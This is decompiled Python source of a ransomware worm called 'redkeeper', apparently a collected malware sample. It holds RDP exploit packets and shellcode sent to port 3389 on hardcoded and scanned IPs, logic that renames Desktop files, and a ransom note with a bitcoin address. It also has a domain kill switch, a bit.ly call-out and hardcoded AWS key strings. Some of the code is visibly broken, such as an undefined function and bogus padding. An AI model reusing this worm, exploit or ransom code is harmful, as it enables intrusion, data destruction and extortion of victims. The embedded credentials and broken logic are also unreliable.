# VX-Underground Sample

# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Apr 12 2019, 15:32:40) 
# [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.3)]
# Embedded file name: redkeeper.py
# Compiled at: 2018-09-20 11:31:08
from os.path import expanduser
import socket
import glob
import os
from random import randint, choice
import struct
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import requests
import sys
aws_access_key_id = 'AKIA35OHX2DSKHT73VPQ'
aws_secret_access_key = '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'

def pdu_connect_initial(hostname):
    host_name = ''
    for i in hostname:
        host_name += struct.pack('<h', ord(i))

    host_name += '\x00' * (32 - len(host_name))
    mcs_gcc_request = '\x03\x00\x01\xca\x02\xf0\x80\x7fe\x82\x01\xbe\x04\x01\x01\x04\x01\x01\x01\x01\xff0 \x02\x02\x00"\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x020 \x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04 \x02\x02\x00\x020 \x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01K\x00\x05\x00\x14|\x00\x01\x81B\x00\x08\x00\x10\x00\x01\xc0\x00Duca\x814\x01\xc0\xd8\x00\x04\x00\x08\x00 \x03X\x02\x01\xca\x03\xaa\t\x04\x00\x00(\n\x00\x00'
    mcs_gcc_request += host_name
    mcs_gcc_request += '\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\t\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\xc0D\x00\x04\x00\x00\x00'
    channel_name = [
     'NEVER\x00\x00\x00\x00\x00\x00\x00', 'GONNA\x00\x00\x00\x00\x00\x00\x00', 'GIVE\x00\x00\x00\x00\x00\x00\x00\x00', 'YOU\x00\x00\x00\x00\x00\x00\x00\x00\x00', 'UP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
    mcs_gcc_request += choice(channel_name)
    mcs_gcc_request += 'MS_T120\x00\x00\x00\x00\x00rdpsnd\x00\x00\xc0\x00\x00\x00snddbg\x00\x00\xc0\x00\x00\x00rdpdr\x00\x00\x00\x80\x80\x00\x00'
    return mcs_gcc_request


def worm(target):
    uname = [
     '@e_kaspersky', '@briankrebs', '@kevinmitnick']
    hname = ['talso', 'sphos', 'startgame', 'mcoffee', 'slowseven', 'selloutvault', 'stratforkoff']
    username = choice(uname)
    hostname = choice(hname)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target, 3389))
    except Exception as e:
        s.close()
        return

    x_224_conn_req = '\x03\x00\x00{0}'
    x_224_conn_req += chr(33 + len(username))
    x_224_conn_req += '\xe0'
    x_224_conn_req += '\x00\x00'
    x_224_conn_req += '\x00\x00'
    x_224_conn_req += '\x00'
    x_224_conn_req += 'Cookie: mstshash='
    x_224_conn_req += username
    x_224_conn_req += '\r\n'
    x_224_conn_req += '\x01'
    x_224_conn_req += '\x00'
    x_224_conn_req += '\x08\x00'
    x_224_conn_req += '\x00\x00\x00\x00'
    try:
        s.sendall(x_224_conn_req.format(chr(33 + len(username) + 5)))
        s.recv(8192)
        s.sendall(pdu_connect_initial(hostname))
        res = s.recv(10000)
    except Exception as e:
        s.close()
        return

    shellcode = '1\xc9'
    shellcode += 'd\x8bq0'
    shellcode += '\x8bv\x0c'
    shellcode += '\x8bv\x1c'
    shellcode += '\x8b6'
    shellcode += '\x8b\x06'
    shellcode += '\x8bh\x08'
    shellcode += '\xeb '
    shellcode += '['
    shellcode += 'S'
    shellcode += 'U'
    shellcode += '['
    shellcode += '\x81\xeb\x11\x11\x11\x11'
    shellcode += '\x81\xc3\xda?\x1a\x11'
    shellcode += '\xff\xd3'
    shellcode += '\x81\xc3\x11\x11\x11\x11'
    shellcode += '\x81\xeb\x8c\xcc\x18\x11'
    shellcode += '\xff\xd3'
    shellcode += '\xe8\xdb\xff\xff\xff'
    shellcode += 'cmd'
    try:
        s.sendall(shellcode)
        s.close()
    except Exception as e:
        s.close()
        return


def drop_note(img):
    bdy = ['You wil have to pay us before you git him from us, and pay us a big cent to, if you put the cops hunting for him you is only defeeting yu own end.', 'If you install this on a microcomputer... then under terms of this license you agree to pay PC Cyborg Corporation in full for the cost of leasing these programs...In the case of your breach of this license agreement, PC Cyborg reserves the right to take legal action necessary to recover any outstanding debts payable to PC Cyborg Corporation and to use program mechanisms to ensure termination of your use...These program mechanisms will adversely affect other program applications...You are hereby advised of the most serious consequences of your failure to abide by the terms of this license agreement; your conscience may haunt you for the rest of your life...and your PC will stop functioning normally... You are strictly prohibited from sharing this product with others...', 'A company can spend hundreds of thousands of dollars on firewalls, intrusion detection systems and encryption and other security technologies, but if an attacker can call one trusted person within the company, and that person complies, and if the attacker gets in, then all that money spent on technology is essentially wasted.', 'You cannot arrest an idea', 'Most hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker.', 'All right hes in the personal ads. Disappointed white male. Cross dresser looking for discreet friend to bring dreams to realiy. Leather, lace and water sports. Transvestites welcome.']
    footer = "Your files have been encrypted.  To decrypt your files send 1,000,000 satoshi (Don't you think we should ask more than 1 million satoshi ?) to address 19GL2cUrn1Xx8XD6VaL25SYAzQd6qnwVb7 "
    special = 'If you like to be a hero when balance is over 100,000,000 satoshi kill switch activates !?! '
    note = img + '\n\n\n' + choice(bdy) + '\n\n\n' + footer + '\n\n\n' + special
    f = open('RTFM.txt', 'a+')
    f.write(note)
    f.close()
    try:
        os.startfile('RTFM.txt')
    except Exception as e:
        print 'Failed to open note {}'.format(e)


def check_domz(switch):
    try:
        socket.gethostbyname(switch)
    except socket.gaierror:
        return False

    return True


def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()


def encrypt(key, filename):
    chunksize = 65536
    outputFile = '(encrypted)' + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += '*(16 \xe2\x80\x93 (len(chunk) % 16))'
                outfile.write(encryptor.encrypt(chunk))


def encrypt_files():
    extension = [
     'WNCRY', 'PCCyborg', 'NEVER', 'GONNA', 'GIVE', 'YOU', 'UP']
    encrypt_key = 'TESTTESTTESTTEST'
    os.chdir(expanduser('~\\Desktop'))
    files_grabbed = [ glob.glob(e) for e in ['*.txt', '*.doc', '*.png', '*.jpg', '.*rtf'] ]
    for files in files_grabbed:
        for fil in files:
            f1 = open(fil, 'r')
            f1.close()
            fname = fil + '.' + choice(extension)
            f = open(fname, 'a+')
            f.write(nyan)
            f.close()


def self_replicate():
    pass


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('1.3.3.7', 1))
    local_ip_address = s.getsockname()[0]
    s.close()
    return local_ip_address


def get_worm_public_target():
    octets = []
    for x in range(4):
        octets.append(str(randint(0, 255)))

    return '.'.join(octets)


if __name__ == '__main__':
    switch = 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwe' + choice(string.ascii_lowercase) + '.com'
    nyan = '\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x88\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n'
    ET = '\\  NDFWET  '
    trigger_SB_IPs = ['13.179.185.111', '13.67.89.198', '52.144.44.134']
    try:
        requests.get('https://bit.ly/2Zlmmzb')
    except Exception as e:
        pass

    try:
        res = requests.get('https://blockchain.info/q/addressbalance/19GL2cUrn1Xx8XD6VaL25SYAzQd6qnwVb7')
        if int(res.text) > 1000000000:
            sys.exit()
    except Exception as e:
        pass

    if not check_domz(switch):
        encrypt_files()
        drop_note(nyan)
        local_ip = get_local_ip()
        ip_parts = local_ip.split('.')
        for ip in trigger_SB_IPs:
            worm(ip)

        for i in range(1, 255):
            ip_parts[3] = str(i)
            worm('.'.join(ip_parts))

        while True:
            if not check_domz(switch):
                worm(get_worm_target())

    else:
        print 'Hero Detected'
# okay decompiling redkeeper_fixed.pyc